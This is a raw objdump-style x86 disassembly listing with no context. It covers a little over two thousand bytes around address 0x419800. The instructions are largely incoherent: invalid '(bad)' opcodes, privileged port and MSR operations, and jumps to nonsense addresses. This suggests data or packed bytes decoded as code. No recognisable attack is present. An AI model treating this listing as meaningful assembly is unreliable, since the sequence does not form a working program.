  41979a:	test   BYTE PTR [eax+eax*1],0xe6
  41979e:	sbb    ah,BYTE PTR [esi-0x7e891702]
  4197a4:	jnp    0x419797
  4197a6:	jbe    0x419823
  4197a8:	push   ds
  4197a9:	xchg   ebx,esi
  4197ab:	std    
  4197ac:	gs pusha 
  4197ae:	mov    bh,0xfb
  4197b0:	or     al,0x56
  4197b2:	add    BYTE PTR [eax],al
  4197b4:	add    BYTE PTR [eax],al
  4197b6:	add    BYTE PTR [esi],dh
  4197b8:	inc    ebp
  4197ba:	lods   al,BYTE PTR ds:[esi]
  4197bb:	pop    DWORD PTR [edx]
  4197bd:	data16 jo 0x4197f7
  4197c0:	or     DWORD PTR ds:0xfd14326d,ecx
  4197c6:	jmp    0xf18fe54a
  4197cb:	push   es
  4197cc:	les    edx,FWORD PTR [eax-0x22]
  4197cf:	inc    ebp
  4197d0:	pop    ds
  4197d1:	adc    BYTE PTR [ecx],ch
  4197d3:	jno    0x419854
  4197d5:	rcl    BYTE PTR [ebp+0x30],0xc3
  4197d9:	adc    DWORD PTR [bx+si+0x2],esi
  4197dd:	add    BYTE PTR [esi+0x2f8afb05],bh
  4197e3:	and    eax,0x81248ac3
  4197e8:	mov    dl,0x50
  4197ea:	xchg   ecx,eax
  4197eb:	jg     0x419836
  4197ed:	std    
  4197ee:	sahf   
  4197ef:	push   ebx
  4197f0:	add    BYTE PTR [ecx],dh
  4197f2:	test   eax,0x640fbbe9
  4197f7:	ss add eax,0x271f584
  4197fd:	add    BYTE PTR [edx-0x3],dh
  419800:	cli    
  419801:	bound  esi,QWORD PTR gs:[edi-0x43c9f2fc]
  419808:	cli    
  419809:	sub    BYTE PTR gs:[esi-0x595877ff],bl
  419810:	add    eax,0x656f29b6
  419815:	mov    edi,0xa806b460
  41981a:	add    BYTE PTR [eax],al
  41981c:	add    BYTE PTR [eax],al
  41981e:	add    BYTE PTR [eax],al
  419820:	lahf   
  419821:	add    BYTE PTR [ebx],0x83
  419824:	sub    al,0xeb
  419826:	jle    0x4197e8
  419828:	mov    BYTE PTR [ebp+0x40160c46],al
  41982e:	or     ecx,DWORD PTR [ebp+0x3851eb2]
  419834:	push   es
  419835:	inc    eax
  419836:	or     ecx,DWORD PTR [eax+0x46c31dca]
  41983c:	ds push es
  41983e:	xor    bx,0xfffb
  419842:	pop    es
  419843:	bswap  ecx
  419845:	lds    eax,FWORD PTR [edi-0x1c5d0ba]
  41984b:	je     0x419843
  41984d:	cld    
  41984e:	mov    dl,0x47
  419850:	inc    edx
  419851:	xchg   eax,edi
  419853:	adc    BYTE PTR [ecx+0x5445c413],ch
  419859:	push   es
  41985a:	jl     0x41985c
  41985c:	sbb    al,0xc3
  41985e:	inc    eax
  41985f:	clc    
  419860:	cmp    al,0x8
  419862:	add    BYTE PTR [eax],al
  419864:	fist   DWORD PTR [ecx-0xf]
  419867:	pop    ds
  419868:	or     al,0x6
  41986a:	add    bl,ch
  41986c:	es xchg eax,edi
  41986f:	and    BYTE PTR [ecx+0x21],ch
  419872:	les    eax,FWORD PTR [ebp+0x4]
  419875:	push   es
  419876:	add    bh,bh
  419878:	or     al,0xc3
  41987a:	inc    eax
  41987b:	clc    
  41987c:	fsub   st(2),st
  41987e:	(bad)  
  41987f:	call   FWORD PTR [ebx]
  419881:	push   edx
  419882:	icebp  
  419883:	inc    DWORD PTR [eax]
  419885:	add    BYTE PTR [eax],al
  419887:	add    BYTE PTR [eax],al
  419889:	int3   
  41988a:	add    eax,0x208a8d00
  41988f:	dec    ebp
  419890:	lea    ebx,[edx+0x198b4d22]
  419896:	(bad)  
  419897:	out    0xd4,eax
  419899:	and    ch,bl
  41989b:	cli    
  41989c:	lea    esi,[ebp+0x61]
  41989f:	in     al,dx
  4198a0:	dec    edi
  4198a1:	add    BYTE PTR [edx-0x21],ch
  4198a4:	dec    edi
  4198a5:	(bad)  
  4198a6:	pop    esi
  4198a7:	sbb    eax,ebp
  4198a9:	mov    ecx,0xe8fd16d1
  4198ae:	popa   
  4198af:	in     eax,0x4f
  4198b1:	add    BYTE PTR [edx-0x17],ch
  4198b4:	dec    edi
  4198b5:	(bad)  
  4198b6:	pop    esi
  4198b7:	or     eax,0x16f1c9e8
  4198bc:	std    
  4198bd:	ud2    
  4198bf:	mov    ah,0x8a
  4198c1:	mov    ebx,0x1de7b12a
  4198c6:	sbb    al,0x2
  4198c8:	add    bh,ch
  4198ca:	push   0x5ab387d1
  4198cf:	or     BYTE PTR [ebp-0x52f7da45],dh
  4198d5:	mov    bl,0x17
  4198d7:	aas    
  4198d8:	inc    esi
  4198d9:	mov    DWORD PTR [edx],ebx
  4198db:	jle    0x41989d
  4198dd:	rcr    DWORD PTR [esi],0x29
  4198e0:	push   ds
  4198e1:	jbe    0x4198fd
  4198e3:	add    DWORD PTR [edi-0x3f81dc4d],eax
  4198e9:	test   eax,0x761839
  4198ee:	add    BYTE PTR [eax],al
  4198f0:	add    BYTE PTR [eax],al
  4198f2:	test   DWORD PTR [eax-0x31],ebx
  4198f5:	cld    
  4198f6:	push   0x753ff08b
  4198fb:	xchg   edx,eax
  4198fc:	mov    esi,0x8d5af803
  419901:	add    esi,DWORD PTR [ebx]
  419903:	ficom  WORD PTR [esi]
  419905:	dec    DWORD PTR [ebx-0x7d]
  419908:	out    0x0,eax
  41990a:	je     0x419927
  41990c:	cmp    DWORD PTR [ebx-0x1e],0xda0e8e1a
  419913:	adc    cl,dh
  419915:	cld    
  419916:	push   0x753ff17f
  41991b:	add    bh,BYTE PTR [ebp-0x17fa95d5]
  419921:	add    eax,DWORD PTR [eax+ebx*1-0x4fafbe9e]
  419928:	mov    cl,0x4a
  41992a:	mov    bh,0x5
  41992c:	out    0x18,eax
  41992e:	sub    eax,DWORD PTR [esi]
  419930:	rcr    DWORD PTR ds:[ecx+0x52f376f6],1
  419937:	add    ch,BYTE PTR [esi]
  419939:	xchg   ecx,eax
  41993a:	jp     0x41994d
  41993c:	cld    
  41993d:	aaa    
  41993e:	gs ret 0x18e6
  419942:	add    ebp,esi
  419944:	(bad)  
  419945:	adc    al,0x77
  419947:	add    edi,esp
  419949:	sbb    bl,ah
  41994b:	jmp    0x18e7:0x1772d0e
  419952:	jecxz  0x41991a
  419954:	(bad)  
  419955:	and    al,0x0
  419957:	add    BYTE PTR [eax],al
  419959:	add    BYTE PTR [eax],al
  41995b:	ja     0x41995e
  41995d:	out    0xb1,eax
  41995f:	push   edx
  419960:	das    
  419961:	jmp    0x34850e6a
  419966:	mov    ecx,DWORD PTR [ecx-0x4e]
  419969:	cmp    al,0x17
  41996b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41996c:	dec    ch
  41996e:	icebp  
  41996f:	ss cmc 
  419971:	es add al,0xec
  419974:	adc    al,BYTE PTR [esp+eax*1]
  419977:	jne    0x419988
  419979:	out    0x8a,eax
  41997b:	inc    ebx
  41997c:	inc    edx
  41997d:	shl    ah,0x7d
  419980:	inc    ecx
  419981:	jb     0x4199c9
  419983:	and    BYTE PTR [ecx],0xe7
  419986:	push   ss
  419987:	jne    0x41998b
  419989:	bound  ebp,QWORD PTR [esi]
  41998b:	xor    ah,BYTE PTR ds:0x41bf0af7
  419991:	(bad)  
  419992:	or     al,0x22
  419994:	and    ch,bh
  419996:	or     bl,BYTE PTR [edx]
  419998:	jp     0x41999a
  41999a:	sub    al,0x6d
  41999c:	pushf  
  41999d:	add    ebx,DWORD PTR [esp+esi*4+0xb]
  4199a1:	push   eax
  4199a2:	data16 in al,0x7
  4199a5:	call   0xfd4edf08
  4199aa:	ins    DWORD PTR es:[edi],dx
  4199ab:	cmp    DWORD PTR [esi-0x69849be9],edx
  4199b1:	setg   BYTE PTR [ebx+0x43e0b93]
  4199b8:	or     al,ch
  4199ba:	inc    edx
  4199bb:	add    eax,0x65fd0d
  4199c0:	add    BYTE PTR [eax],al
  4199c2:	add    BYTE PTR [eax],al
  4199c4:	xor    DWORD PTR [esi+0x19785903],edx
  4199ca:	add    bl,bl
  4199cc:	ss mov al,0xc6
  4199cf:	sub    eax,DWORD PTR [ecx-0x629dacfe]
  4199d5:	(bad)  
  4199d6:	jmp    0x41995d
  4199d8:	je     0x4199dc
  4199da:	add    BYTE PTR [edx-0x60f45511],bl
  4199e0:	and    edi,DWORD PTR [edx+0x7b]
  4199e3:	loope  0x419a01
  4199e5:	sti    
  4199e6:	addr16 in eax,dx
  4199e8:	repz into 
  4199ea:	push   DWORD PTR ds:0xd6944b89
  4199f0:	mov    eax,DWORD PTR [esi+0xdaadec0]
  4199f6:	add    eax,0x3f9a76e9
  4199fb:	ss push ds
  4199fd:	packuswb mm4,mm5
  419a00:	std    
  419a01:	ret    0x19c7
  419a04:	pop    ecx
  419a05:	and    eax,0x866ba691
  419a0a:	shr    dh,0x7a
  419a0d:	and    eax,0x9c76e905
  419a12:	add    esi,DWORD PTR [ecx]
  419a14:	and    DWORD PTR [ebx+ecx*2+0x0],edi
  419a18:	and    al,0x56
  419a1a:	mov    dh,0x14
  419a1c:	jecxz  0x419a60
  419a1e:	std    
  419a1f:	out    0xff,eax
  419a21:	out    0xff,eax
  419a23:	call   DWORD PTR [ecx-0x3d]
  419a26:	or     al,BYTE PTR [ebp+0x0]
  419a2c:	add    BYTE PTR [ecx+0x44fffd10],cl
  419a32:	inc    edx
  419a33:	int3   
  419a34:	mov    cl,ah
  419a36:	ror    DWORD PTR [eax+0x417a3b7d],cl
  419a3c:	int3   
  419a3d:	inc    esp
  419a3e:	les    eax,FWORD PTR [edx]
  419a40:	add    BYTE PTR [ecx+edi*2+0x4219e579],cl
  419a47:	int    0xe8
  419a49:	add    al,0x10
  419a4b:	std    
  419a4c:	dec    DWORD PTR [ebx-0x741abf44]
  419a52:	mov    esp,0xc702ff48
  419a57:	fisttp WORD PTR [eax]
  419a59:	repnz clc 
  419a5b:	mov    esp,0xc1a30f
  419a60:	std    
  419a61:	pop    eax
  419a62:	clc    
  419a63:	cli    
  419a64:	mov    ecx,0x15c
  419a69:	repnz sub BYTE PTR [esi+0x37ad30f],bh
  419a70:	add    BYTE PTR [ebx+edi*2+0x7],cl
  419a74:	add    ecx,0xffffffde
  419a77:	push   DWORD PTR [edx]
  419a79:	cmp    eax,DWORD PTR [esi+0x5653e841]
  419a7f:	mov    dl,BYTE PTR [ebp+0x28]
  419a82:	jp     0x419afd
  419a84:	in     al,dx
  419a85:	retf   
  419a86:	push   ebx
  419a87:	add    DWORD PTR [ebx-0x377925af],ecx
  419a8d:	xchg   esi,edx
  419a8f:	mov    esp,0xea
  419a94:	add    BYTE PTR [eax],al
  419a96:	cld    
  419a97:	sbb    ch,0x0
  419a9a:	jne    0x419ab7
  419a9c:	adc    al,0x0
  419a9e:	jle    0x419b01
  419aa0:	xchg   eax,edx
  419aa2:	and    ebx,DWORD PTR [esp+edx*1]
  419aa5:	add    BYTE PTR [ebp+0x38],dh
  419aa8:	sub    edi,DWORD PTR [edi-0x2ff7d42b]
  419aae:	pop    edi
  419aaf:	daa    
  419ab0:	xchg   BYTE PTR [ebx-0x2b],al
  419ab3:	fisubr DWORD PTR [eax]
  419ab5:	or     BYTE PTR [ecx+edi*4+0x2eb2500b],dh
  419abc:	or     DWORD PTR [ecx],ecx
  419abe:	mov    edi,0x8ddfc4a2
  419ac3:	enter  0xfd6e,0x9a
  419ac7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ac8:	inc    ebx
  419ac9:	jae    0x419b44
  419acb:	cwde   
  419acc:	(bad)  
  419acd:	jmp    0x419a59
  419acf:	mov    al,ds:0xf3f6ebbc
  419ad4:	add    ecx,DWORD PTR ds:0xfffc0df1
  419ada:	jb     0x419b3f
  419adc:	add    al,0x83
  419ade:	xchg   edi,eax
  419adf:	and    al,0x1
  419ae1:	add    ch,cl
  419ae3:	pop    ebx
  419ae4:	mov    WORD PTR [eax],ds
  419ae6:	jne    0x419b5c
  419ae8:	mov    BYTE PTR [ebx+0x7d],bh
  419aeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419aec:	mov    esp,0xc03a5fc
  419af1:	xchg   ecx,eax
  419af2:	inc    edx
  419af3:	and    al,0x7d
  419af5:	shr    BYTE PTR [edx-0x59],0x8
  419af9:	add    eax,0x0
  419afe:	add    BYTE PTR [ebp+0x1b],dh
  419b01:	cmp    DWORD PTR [ebx+0x2a],0x7209881b
  419b08:	scas   al,BYTE PTR es:[edi]
  419b09:	ds std 
  419b0b:	(bad)  
  419b0c:	adc    edi,DWORD PTR [ebp-0x40]
  419b0f:	sbb    BYTE PTR [edi+0x1b75060c],0x88
  419b16:	or     esi,esi
  419b18:	add    DWORD PTR [esp],ecx
  419b1b:	jne    0x419b9c
  419b1d:	and    al,0x8c
  419b1f:	inc    ebp
  419b20:	jg     0x419b5e
  419b22:	and    al,0xe8
  419b24:	mov    al,0xda
  419b26:	mov    BYTE PTR [ebp-0xefb4f7a],ch
  419b2c:	daa    
  419b2d:	in     eax,0x3
  419b2f:	jne    0x419b3e
  419b31:	cld    
  419b32:	repz inc esi
  419b35:	pop    esi
  419b36:	sub    eax,DWORD PTR [esi+0xe]
  419b39:	data16 adc al,0xec
  419b3c:	sub    DWORD PTR [eax+edi*1-0x80],esp
  419b40:	xchg   BYTE PTR [edi*8-0x71b1f356],ch
  419b47:	ret    0xdc0c
  419b4a:	aas    
  419b4b:	xchg   edx,eax
  419b4d:	out    0x4,al
  419b4f:	retf   
  419b50:	mov    eax,0xa38d88df
  419b55:	popa   
  419b56:	sar    BYTE PTR [edx-0x5c],0x27
  419b5a:	and    ebp,DWORD PTR [ebp-0x5c]
  419b5d:	icebp  
  419b5e:	inc    edx
  419b5f:	fstp   TBYTE PTR [ecx-0x54]
  419b62:	ja     0x419b64
  419b64:	add    BYTE PTR [eax],al
  419b66:	add    BYTE PTR [eax],al
  419b68:	shl    DWORD PTR [edi-0x56],cl
  419b6b:	or     DWORD PTR [eax+0x54],esi
  419b6e:	mov    dl,0x8
  419b70:	rol    DWORD PTR [ecx+0x7],cl
  419b73:	or     ebx,ebx
  419b75:	mul    DWORD PTR [edi]
  419b77:	popf   
  419b78:	repz lds ecx,FWORD PTR [eax+ecx*4+0x38]
  419b7d:	out    0xe6,al
  419b7f:	add    edi,DWORD PTR [eax]
  419b81:	add    esi,DWORD PTR [edx+0x43]
  419b84:	repnz sbb edi,esi
  419b87:	(bad)  
  419b88:	jmp    0x419c01
  419b8a:	sahf   
  419b8b:	inc    ebp
  419b8c:	inc    edx
  419b8d:	repz jno 0x419bcb
  419b90:	push   esp
  419b91:	xor    al,0xf2
  419b93:	cmp    eax,0xe1001ad2
  419b98:	mov    cl,0x2b
  419b9a:	or     dl,ah
  419b9c:	mov    ecx,0xdb594383
  419ba1:	sti    
  419ba2:	mov    ch,BYTE PTR [edx]
  419ba4:	fnstcw WORD PTR [ebx-0x4daed376]
  419baa:	out    0x82,eax
  419bac:	jns    0x419bb9
  419bae:	std    
  419baf:	wrmsr  
  419bb1:	mov    edi,0x4d1cf1a3
  419bb6:	inc    ebx
  419bb7:	dec    edi
  419bb8:	leave  
  419bb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bba:	mov    esi,0x69fa2124
  419bbf:	add    esp,esi
  419bc1:	mov    edi,0x8f87b99b
  419bc6:	pop    es
  419bc7:	inc    ecx
  419bc8:	jnp    0x419c3a
  419bca:	std    
  419bcb:	dec    esi
  419bcc:	add    BYTE PTR [eax],al
  419bce:	add    BYTE PTR [eax],al
  419bd0:	add    ch,ch
  419bd2:	inc    edx
  419bd3:	or     eax,0x5b96d
  419bd8:	jmp    0xddb5a9da
  419bdd:	iret   
  419bde:	push   cs
  419bdf:	jae    0x419c2a
  419be1:	pop    WORD PTR [edi]
  419be4:	adc    DWORD PTR [ebx+0x70],edx
  419be7:	std    
  419be8:	push   ds
  419be9:	std    
  419bea:	inc    ecx
  419beb:	or     eax,0x5616d
  419bf0:	jmp    0xdf9163d8
  419bf5:	or     esi,DWORD PTR ss:[ebp+0x267fe]
  419bfc:	aaa    
  419bfd:	data16 add al,BYTE PTR [eax]
  419c00:	jmp    0x4f97d6c8
  419c05:	mov    eax,0xfd6cd8bf
  419c0a:	jns    0x419c0a
  419c0c:	(bad)  
  419c0d:	xchg   DWORD PTR [eax-0x4050c701],ebx
  419c13:	xlat   BYTE PTR ds:[ebx]
  419c14:	add    BYTE PTR [ecx+ebx*2],cl
  419c17:	xchg   BYTE PTR [ebp-0x2b],cl
  419c1a:	out    dx,eax
  419c1b:	rcl    BYTE PTR [esi+0xf],cl
  419c1e:	jmp    0xf2d621ab
  419c23:	cli    
  419c24:	(bad)  
  419c25:	cmp    dl,BYTE PTR [esi-0x4]
  419c28:	xlat   BYTE PTR ds:[ebx]
  419c29:	pop    edi
  419c2a:	ret    
  419c2b:	pop    ss
  419c2c:	mov    DWORD PTR [ecx+0x607584fe],ecx
  419c32:	test   BYTE PTR [ecx-0x8],bh
  419c35:	add    BYTE PTR [eax],al
  419c37:	add    BYTE PTR [eax],al
  419c39:	add    ah,cl
  419c3b:	inc    DWORD PTR [ebp-0x12327]
  419c41:	imul   ebx,esp,0xcc012966
  419c47:	dec    BYTE PTR [eax+0x304ec445]
  419c4d:	rol    BYTE PTR [esp+ebp*4-0x6d],0xff
  419c52:	inc    ebx
  419c53:	test   al,bh
  419c55:	inc    ebx
  419c57:	jns    0x419c17
  419c59:	add    BYTE PTR [esi+edi*8+0xa6015fa],cl
  419c60:	cmp    eax,0x244a8100
  419c65:	add    BYTE PTR [edi+edi*8-0x1767680],cl
  419c6c:	inc    DWORD PTR [edx+0x73fd1211]
  419c72:	push   edi
  419c73:	push   0x1209fffc
  419c78:	cld    
  419c79:	adc    eax,0x3d1150
  419c7e:	(bad)  
  419c7f:	cmp    cl,BYTE PTR [ecx]
  419c81:	mov    edx,DWORD PTR [ebp+esi*8+0x4f]
  419c85:	adc    bh,dl
  419c87:	jb     0x419c7e
  419c89:	sub    DWORD PTR [ecx+0x5384fd0e],0x6b
  419c90:	outs   dx,BYTE PTR ds:[esi]
  419c91:	xor    DWORD PTR [ebp-0x4a],0x1b
  419c95:	add    BYTE PTR [esi-0x4f7706c8],cl
  419c9b:	das    
  419c9c:	jnp    0x419ce9
  419c9e:	add    BYTE PTR [eax],al
  419ca0:	add    BYTE PTR [eax],al
  419ca2:	add    BYTE PTR ds:0x90fed797,bl
  419ca8:	pushf  
  419ca9:	xchg   ecx,eax
  419caa:	add    dh,BYTE PTR [ebp-0x2f]
  419cad:	mov    edx,0x6e1f665
  419cb2:	add    BYTE PTR [ebx-0x21],ch
  419cb5:	mov    ecx,0x7c2360fc
  419cba:	ror    ebp,0x98
  419cbd:	push   ss
  419cbe:	std    
  419cbf:	ficomp DWORD PTR [ebx+ecx*1-0x15607d03]
  419cc6:	add    dh,BYTE PTR [ebp+0x1b]
  419cc9:	xchg   al,al
  419ccb:	jb     0x419c6c
  419ccd:	repnz add dh,BYTE PTR [ebp+0x1b]
  419cd1:	test   al,bh
  419cd3:	je     0x419d03
  419cd5:	in     al,0x88
  419cd7:	xor    BYTE PTR [ebx],cl
  419cd9:	sar    DWORD PTR [eax],0x38
  419cdc:	mov    bl,0x94
  419cde:	adc    DWORD PTR [edx-0x5d7ef6b2],ebx
  419ce4:	adc    bh,BYTE PTR [ebp+ecx*8-0x8]
  419ce8:	inc    esi
  419ce9:	sbb    eax,0x3d9c3e8
  419cee:	add    BYTE PTR [esi-0x34f964ed],cl
  419cf4:	repz call 0x8543:0x101b75ff
  419cfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cfd:	les    ecx,FWORD PTR [edi]
  419cff:	not    BYTE PTR [ebp+0x19]
  419d02:	pop    es
  419d03:	mov    ds,WORD PTR [esi+0x9]
  419d06:	jb     0x419d08
  419d08:	add    BYTE PTR [eax],al
  419d0a:	add    BYTE PTR [eax],al
  419d0c:	jecxz  0x419ca9
  419d0e:	mov    WORD PTR [ebx],ss
  419d10:	jne    0x419d3a
  419d12:	test   DWORD PTR [ecx],ebp
  419d14:	cmp    al,BYTE PTR [edx]
  419d16:	out    0x10,al
  419d18:	xor    BYTE PTR [edi-0x579ef0e],cl
  419d1e:	stc    
  419d1f:	ret    
  419d20:	and    bl,BYTE PTR [edx]
  419d22:	in     al,dx
  419d23:	adc    BYTE PTR [eax],bl
  419d25:	or     DWORD PTR [edx-0x72],esi
  419d28:	jp     0x419cc4
  419d2a:	es cdq 
  419d2c:	ins    DWORD PTR es:[edi],dx
  419d2d:	add    al,BYTE PTR [ecx+0x3]
  419d30:	out    dx,al
  419d31:	mov    esi,0x2012b3ad
  419d36:	ja     0x419d48
  419d38:	lock jge 0x419ce2
  419d3b:	add    cl,dh
  419d3d:	inc    edx
  419d3e:	jmp    0x419d43
  419d40:	jne    0x419d3b
  419d42:	push   esp
  419d43:	(bad)  
  419d44:	fld    DWORD PTR [edi+ecx*4-0x24817ffd]
  419d4b:	pop    es
  419d4c:	jne    0x419d50
  419d4e:	pop    ds
  419d4f:	mov    esp,0x5a47e71
  419d54:	jne    0x419d58
  419d56:	scas   eax,DWORD PTR es:[edi]
  419d57:	add    cl,bh
  419d59:	(bad)  
  419d5a:	call   0xe5fc1262
  419d5f:	xchg   DWORD PTR [esi+0x2d03e702],ebp
  419d65:	stc    
  419d66:	push   0x64
  419d68:	jne    0x419d6c
  419d6a:	out    0xbb,eax
  419d6c:	jns    0x419ded
  419d6e:	push   edi
  419d6f:	pop    es
  419d70:	add    BYTE PTR [eax],al
  419d72:	add    BYTE PTR [eax],al
  419d74:	add    BYTE PTR [ebp+0x2],dh
  419d77:	mov    edi,0xe6ed01c3
  419d7c:	popf   
  419d7d:	jne    0x419df4
  419d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d80:	jae    0x419d47
  419d82:	sbb    dh,BYTE PTR [ebx+esi*2+0x60]
  419d86:	or     BYTE PTR [ebx+0x43],ah
  419d89:	push   0x75077f7e
  419d8e:	add    cl,BYTE PTR [edi-0x143e3d]
  419d94:	call   0xa4cca179
  419d99:	mov    dl,0xb2
  419d9b:	out    0x6c,eax
  419d9d:	test   eax,0xb165fd05
  419da2:	cmc    
  419da3:	or     DWORD PTR [ecx+0x6d],0x2
  419da7:	add    BYTE PTR [edx+0x34],ah
  419daa:	inc    esp
  419dab:	mov    DWORD PTR [eax-0x4102f7e4],ebp
  419db1:	jno    0x419e2c
  419db3:	iret   
  419db4:	test   al,0x5f
  419db6:	repnz or BYTE PTR [ebx-0x7440c882],ch
  419dbd:	jmp    0x7c2b7c4a
  419dc2:	add    al,BYTE PTR [eax]
  419dc4:	loop   0x419d6f
  419dc6:	inc    edi
  419dc7:	call   0x865cfad
  419dcc:	repnz xor al,0x7f
  419dcf:	inc    ebx
  419dd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dd1:	mov    cl,0xf6
  419dd3:	add    eax,0x7a
  419dd6:	add    al,BYTE PTR [eax]
  419dd8:	add    DWORD PTR [eax],0x0
  419dde:	fiadd  WORD PTR ds:0x122fe900
  419de4:	adc    DWORD PTR [edi-0x56],0xffffff83
  419de8:	sbb    ch,ch
  419dea:	jbe    0x419dee
  419dec:	push   0xffeb03a9
  419df1:	inc    ebp
  419df2:	in     al,dx
  419df3:	inc    ebx
  419df4:	push   esi
  419df5:	push   ecx
  419df6:	mov    eax,ds:0xed36fd77
  419dfb:	inc    edx
  419dfc:	or     eax,0x37e65
  419e01:	jmp    0x724d61f5
  419e06:	sub    al,0x43
  419e08:	mov    ecx,esp
  419e0a:	sub    BYTE PTR [esi],al
  419e0c:	push   eax
  419e0d:	in     eax,dx
  419e0e:	and    BYTE PTR [edi],bl
  419e10:	ins    BYTE PTR es:[edi],dx
  419e11:	add    BYTE PTR [edx-0x2],bh
  419e14:	(bad)  
  419e15:	call   0x3c931b
  419e1a:	xlat   BYTE PTR ds:[ebx]
  419e1b:	jno    0x419e22
  419e1d:	push   0x18700c
  419e22:	(bad)  
  419e23:	stc    
  419e24:	mov    BYTE PTR [ebp+0x4c],al
  419e27:	push   ebx
  419e28:	in     eax,0xfe
  419e2a:	fwait
  419e2b:	clc    
  419e2c:	cli    
  419e2d:	test   ah,cl
  419e2f:	pop    es
  419e30:	sbb    ecx,0x6600031f
  419e36:	fnstsw WORD PTR [ecx]
  419e38:	out    dx,al
  419e39:	or     BYTE PTR [edx+0x14f340bd],dh
  419e3f:	imul   edx,DWORD PTR [ebx+esi*1],0x0
  419e46:	add    BYTE PTR [ebx],bl
  419e48:	mov    ch,0xff
  419e4a:	jg     0x419e28
  419e4c:	add    bh,bl
  419e4e:	adc    eax,0x3d0f44
  419e53:	push   ecx
  419e54:	ret    
  419e55:	mov    esp,DWORD PTR gs:[ecx-0x6e6af52b]
  419e5c:	adc    esp,DWORD PTR [ebx+0x39]
  419e5f:	xchg   ecx,eax
  419e60:	in     eax,dx
  419e61:	jo     0x419e6d
  419e63:	jb     0x419df0
  419e65:	inc    eax
  419e66:	fcmovnb st,st(2)
  419e68:	xor    eax,0xf9c0f342
  419e6d:	mov    ebp,0x30c01
  419e72:	mov    dl,cl
  419e74:	fimul  DWORD PTR [ecx-0x3076b3b3]
  419e7a:	cmp    BYTE PTR ds:0x8de27ffe,0x38
  419e81:	(bad)  
  419e82:	je     0x419ef6
  419e84:	jp     0x419e4b
  419e86:	je     0x419ef5
  419e88:	xor    esi,eax
  419e8a:	cmp    BYTE PTR [ecx],bl
  419e8c:	adc    DWORD PTR [esp+edx*4],ecx
  419e8f:	jne    0x419e6b
  419e91:	mov    ebx,0x821e5480
  419e96:	mov    edi,0x30fdf077
  419e9b:	cmp    al,0x44
  419e9d:	rcl    BYTE PTR [eax],0x72
  419ea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ea1:	inc    ebx
  419ea2:	inc    edi
  419ea3:	idiv   dl
  419ea5:	cld    
  419ea6:	xor    BYTE PTR [eax+ebx*1],0xf8
  419eaa:	out    dx,al
  419eab:	add    BYTE PTR [eax],al
  419ead:	add    BYTE PTR [eax],al
  419eaf:	add    bh,bh
  419eb1:	(bad)  
  419eb2:	adc    ecx,DWORD PTR [edx+0x4209c45]
  419eb8:	cmc    
  419eb9:	cmp    DWORD PTR [eax],ecx
  419ebb:	cmp    bh,BYTE PTR [edi]
  419ebd:	enter  0x83e5,0x3c
  419ec1:	shl    al,1
  419ec3:	xor    BYTE PTR [esp+edx*1],ch
  419ec6:	mov    esi,0x40af6a10
  419ecb:	inc    edi
  419ecc:	idiv   BYTE PTR [edx+0xa]
  419ecf:	xor    DWORD PTR [ebx+edx*1+0x62a60d18],0x24864acc
  419eda:	jne    0x419e9b
  419edc:	cmp    al,0x98
  419ede:	and    ah,dh
  419ee0:	neg    BYTE PTR [edx-0xc]
  419ee3:	or     ah,al
  419ee5:	mov    eax,ds:0x7af5efbc
  419eea:	add    ah,BYTE PTR [edi+esi*2]
  419eed:	loope  0x419f2a
  419eef:	je     0x419e76
  419ef1:	call   0x1cee2339
  419ef6:	jne    0x419eb8
  419ef8:	sub    eax,0xf6e02398
  419efd:	fcmovnb st,st(3)
  419eff:	or     BYTE PTR [ebp+0x6defc4cd],al
  419f05:	inc    edi
  419f06:	cli    
  419f07:	imul   edi,ebp,0x7d003d99
  419f0d:	add    ah,bh
  419f0f:	add    ecx,eax
  419f11:	or     al,0xa4
  419f13:	adc    eax,DWORD PTR [eax]
  419f15:	add    BYTE PTR [eax],al
  419f17:	add    BYTE PTR [eax],al
  419f19:	test   DWORD PTR [esi-0x7d0d6621],ecx
  419f1f:	sbb    eax,0xe7027d04
  419f24:	lods   al,BYTE PTR ds:[esi]
  419f25:	fdiv   st(7),st
  419f27:	imul   eax,edi,0x52
  419f2a:	mov    dl,0x63
  419f2c:	(bad)  
  419f2d:	and    dh,BYTE PTR [edx+0x22e69fe]
  419f33:	out    0xfc,eax
  419f35:	loope  0x419ef5
  419f37:	fnstenv [edx+esi*4+0xbc69df5]
  419f3e:	mov    dl,0x61
  419f40:	(bad)  
  419f41:	jle    0x419fbc
  419f43:	out    dx,eax
  419f44:	js     0x419f69
  419f46:	add    eax,0xf01bec17
  419f4b:	mov    bl,0xc
  419f4d:	clc    
  419f4e:	js     0x419f7c
  419f50:	cld    
  419f51:	pop    edx
  419f52:	ret    0xe91d
  419f55:	jmp    0x376e:0x367ee59a
  419f5c:	sbb    al,0xbc
  419f5e:	jae    0x419eee
  419f60:	or     al,0xf9
  419f62:	inc    ecx
  419f63:	test   BYTE PTR [edi+0x3e70003],0xf5
  419f6a:	xchg   BYTE PTR [edx+0x3],bl
  419f6d:	push   0xe8fca76f
  419f72:	inc    ecx
  419f73:	mov    bh,0x78
  419f75:	ss ins DWORD PTR es:[edi],dx
  419f77:	jb     0x419fac
  419f79:	in     al,dx
  419f7a:	cmp    DWORD PTR [eax],ebp
  419f7c:	sbb    al,BYTE PTR [eax]
  419f7e:	add    BYTE PTR [eax],al
  419f80:	add    BYTE PTR [eax],al
  419f82:	test   DWORD PTR [ebx+0x5750349],eax
  419f88:	out    0xf8,eax
  419f8a:	mov    ebx,0xa2422f78
  419f8f:	icebp  
  419f90:	dec    DWORD PTR [ebx]
  419f92:	jno    0x419f9b
  419f94:	add    cl,ch
  419f96:	ins    DWORD PTR es:[edi],dx
  419f97:	cmp    al,0x89
  419f99:	lods   al,BYTE PTR ds:[esi]
  419f9a:	push   0x45
  419f9c:	fcomip st,st(1)
  419f9e:	mov    bh,0x18
  419fa0:	or     dl,ah
  419fa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fa3:	jns    0x419fad
  419fa5:	push   cs
  419fa6:	push   es
  419fa7:	lock out 0x40,al
